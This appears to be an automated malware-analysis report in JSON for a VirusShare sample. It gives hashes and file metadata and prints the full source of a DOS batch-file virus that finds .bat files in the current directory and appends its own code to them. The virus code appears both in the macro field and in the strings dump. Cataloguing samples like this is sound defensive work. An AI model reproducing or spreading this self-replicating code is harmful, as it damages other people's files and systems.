@@ -1,0 +1,61 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros",
+            "command": "May run PowerShell commands"
+        },
+        "macro": "@echo off&gt;nul.virii\n\nif exist %0.bat set virii=%0.bat\nif exist %0 ste virii=%0\nif !%1==!  goto virii_start\nif %1==/infect goto virii_infect\nif %1==/find goto virii_find\n\n:virii_start\nREM Will find all batch files in current diectory\necho Finding files to infect with virii\nfor %%a in (*.bat) do command /e:10000 /c %virii% /infect %%a\n\ngoto virii_end\n\n:virii_infect\nREM This part makes sure virii does not infect itself or\nREM previoulsy infected files\necho Checking %2 and making sure it has not been previously infected\nset file_virii=%0\nfind \"file_virii=%0\" &lt;%2&gt;viriix.bat\ncall viriix\ndel viriix.bat\nif \"%file_virii%==\"viriix echo %2 is allready infected\nif \"%file_virii%--\"viriix exit\nREM End of check\n\necho The virii is now infecting %2\ntype %2 &gt; viriix.bat\nfind \"virii\" &lt;%virii%&gt;&gt; viriix.bat\n\ngoto virii_end\n\n:virii_end"
+    },
+    "filename": "VirusShare_457b38c82a71025f4e762d3cd78a6070",
+    "filesize": 881,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "457b38c82a71025f4e762d3cd78a6070",
+        "sha1": "3351dc20fabb218e47a5b4de31b44b2ee9c7804a",
+        "sha256": "83439805d2f56aa3ad41112ad39b11bf29c6b9a61caf9100010bf8f5713da236"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off&gt;nul.virii",
+            "if exist %0.bat set virii=%0.bat",
+            "if exist %0 ste virii=%0",
+            "if !%1==!  goto virii_start",
+            "if %1==/infect goto virii_infect",
+            "if %1==/find goto virii_find",
+            ":virii_start",
+            "REM Will find all batch files in current diectory",
+            "echo Finding files to infect with virii",
+            "for %%a in (*.bat) do command /e:10000 /c %virii% /infect %%a",
+            "goto virii_end",
+            ":virii_infect",
+            "REM This part makes sure virii does not infect itself or",
+            "REM previoulsy infected files",
+            "echo Checking %2 and making sure it has not been previously infected",
+            "set file_virii=%0",
+            "find \"file_virii=%0\" &lt;%2&gt;viriix.bat",
+            "call viriix",
+            "del viriix.bat",
+            "if \"%file_virii%==\"viriix echo %2 is allready infected",
+            "if \"%file_virii%--\"viriix exit",
+            "REM End of check",
+            "echo The virii is now infecting %2",
+            "type %2 &gt; viriix.bat",
+            "find \"virii\" &lt;%virii%&gt;&gt; viriix.bat",
+            "goto virii_end",
+            ":virii_end"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.262288",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
